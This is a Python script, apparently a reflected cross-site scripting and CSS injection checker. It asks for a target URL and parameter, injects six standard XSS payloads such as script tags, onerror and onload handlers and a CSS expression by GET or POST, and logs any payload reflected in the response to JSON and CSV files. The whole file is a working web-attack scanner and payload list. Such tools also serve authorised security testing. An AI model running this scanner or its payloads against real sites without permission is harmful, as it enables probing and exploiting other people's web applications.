import requests
import threading
import urllib.parse
import json
import csv
from datetime import datetime

payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<body style=\"background:url('javascript:alert(1)')\">",
    "div[style*=\"expression(alert(1))\"]"
]

results = []
lock = threading.Lock()

def test_payload(url, param, method="GET", headers=None, data=None):
    for payload in payloads:
        target_params = data.copy() if data else {}
        target_params[param] = payload

        if method.upper() == "GET":
            full_url = f"{url}?{urllib.parse.urlencode(target_params)}"
            resp = requests.get(full_url, headers=headers, timeout=10)
        else:
            full_url = url
            resp = requests.post(full_url, headers=headers, data=target_params, timeout=10)

        if payload in resp.text:
            result = {
                "url": full_url,
                "param": param,
                "payload": payload,
                "status": resp.status_code,
                "reflected": True,
                "timestamp": datetime.utcnow().isoformat()
            }
            with lock:
                results.append(result)
                print(f"[!] Reflected: {param} = {payload} on {full_url}")

def run_xss_css_checker():
    print("\n--- XSS & CSS Injection Checker ---")
    url = input("Enter the target URL (e.g., https://target.com/search): ").strip()
    param = input("Parameter to test (e.g., q): ").strip()
    method = input("Request method [GET/POST]: ").strip().upper()
    use_threads = input("Threaded? (y/n): ").strip().lower() == 'y'
    threads = []

    # Single param dictionary to inject payloads
    base_data = {param: "test"}

    if use_threads:
        for _ in range(10):
            t = threading.Thread(target=test_payload, args=(url, param, method, None, base_data))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
    else:
        test_payload(url, param, method, None, base_data)

    if results:
        with open("xss_results.json", "w") as jf:
            json.dump(results, jf, indent=2)

        with open("xss_results.csv", "w", newline='') as cf:
            writer = csv.DictWriter(cf, fieldnames=results[0].keys())
            writer.writeheader()
            writer.writerows(results)

        print(f"\n[+] Results saved to xss_results.json and xss_results.csv")
    else:
        print("[+] No reflections detected.")


